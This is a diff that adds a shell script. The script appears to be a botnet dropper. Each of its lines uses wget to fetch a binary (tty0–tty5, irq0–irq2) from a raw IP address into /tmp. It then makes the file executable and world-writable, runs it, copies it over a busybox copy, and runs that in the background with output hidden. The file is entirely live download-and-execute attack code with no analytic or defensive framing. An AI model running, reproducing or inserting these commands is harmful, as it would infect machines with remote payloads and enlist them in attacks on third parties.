@@ -1,0 +1,14 @@
+rm -rf /tmp/loop*
+wget http://92.207.203.157/x/tty0 -O /tmp/tty0 ; chmod +x /tmp/tty0 ; chmod 777 /tmp/tty0 ; /tmp/tty0 ; cp /bin/busybox /tmp/loop0 ; cat /tmp/tty0 > /tmp/loop0 ; /tmp/loop0 > /dev/null 2>&1 &
+wget http://92.207.203.157/x/tty1 -O /tmp/tty1 ; chmod +x /tmp/tty1 ; chmod 777 /tmp/tty1 ; /tmp/tty1 ; cp /bin/busybox /tmp/loop1 ; cat /tmp/tty1 > /tmp/loop1 ; /tmp/loop1 > /dev/null 2>&1 &
+wget http://92.207.203.157/x/tty2 -O /tmp/tty2 ; chmod +x /tmp/tty2 ; chmod 777 /tmp/tty2 ; /tmp/tty2 ; cp /bin/busybox /tmp/loop2 ; cat /tmp/tty2 > /tmp/loop2 ; /tmp/loop2 > /dev/null 2>&1 &
+wget http://92.207.203.157/x/tty3 -O /tmp/tty3 ; chmod +x /tmp/tty3 ; chmod 777 /tmp/tty3 ; /tmp/tty3 ; cp /bin/busybox /tmp/loop3 ; cat /tmp/tty3 > /tmp/loop3 ; /tmp/loop3 > /dev/null 2>&1 &
+wget http://92.207.203.157/x/tty4 -O /tmp/tty4 ; chmod +x /tmp/tty4 ; chmod 777 /tmp/tty4 ; /tmp/tty4 ; cp /bin/busybox /tmp/loop4 ; cat /tmp/tty4 > /tmp/loop4 ; /tmp/loop4 > /dev/null 2>&1 &
+wget http://92.207.203.157/x/tty5 -O /tmp/tty5 ; chmod +x /tmp/tty5 ; chmod 777 /tmp/tty5 ; /tmp/tty5 ; cp /bin/busybox /tmp/loop5 ; cat /tmp/tty5 > /tmp/loop5 ; /tmp/loop5 > /dev/null 2>&1 &
+wget http://92.207.203.157/x/tty5 -O /tmp/tty6 ; chmod +x /tmp/tty6 ; chmod 777 /tmp/tty6 ; /tmp/tty6 ; cp /bin/busybox /tmp/loop6 ; cat /tmp/tty6 > /tmp/loop6 ; /tmp/loop6 > /dev/null 2>&1 &
+
+wget http://92.207.203.157/x/irq0 -O /tmp/irq0 ; chmod +x /tmp/irq0 ; chmod 777 /tmp/irq0 ; /tmp/irq0 ; cp /bin/busybox /tmp/loopd0 ; cat /tmp/irq0 > /tmp/loopd0 ; /tmp/loopd0 > /dev/null 2>&1 &
+wget http://92.207.203.157/x/irq1 -O /tmp/irq1 ; chmod +x /tmp/irq1 ; chmod 777 /tmp/irq1 ; /tmp/irq1 ; cp /bin/busybox /tmp/loopd1 ; cat /tmp/irq1 > /tmp/loopd1 ; /tmp/loopd1 > /dev/null 2>&1 &
+wget http://92.207.203.157/x/irq2 -O /tmp/irq2 ; chmod +x /tmp/irq2 ; chmod 777 /tmp/irq2 ; /tmp/irq2 ; cp /bin/busybox /tmp/loopd2 ; cat /tmp/irq2 > /tmp/loopd2 ; /tmp/loopd2 > /dev/null 2>&1 &
+
+rm -rf /tmp/2sh
